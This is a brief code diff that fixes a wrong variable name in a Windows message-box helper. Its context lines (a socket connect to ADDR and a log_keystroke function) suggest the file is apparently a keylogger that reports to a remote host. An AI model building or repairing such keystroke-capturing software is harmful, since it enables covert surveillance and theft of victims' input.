@@ -18,7 +18,7 @@ client.connect(ADDR)
 
 
 def message_box(tit, txt, st):
-    return ctypes.windll.user32.MessageBoxW(0, text, tit, st)
+    return ctypes.windll.user32.MessageBoxW(0, txt, tit, st)
 
 
 def log_keystroke(key):
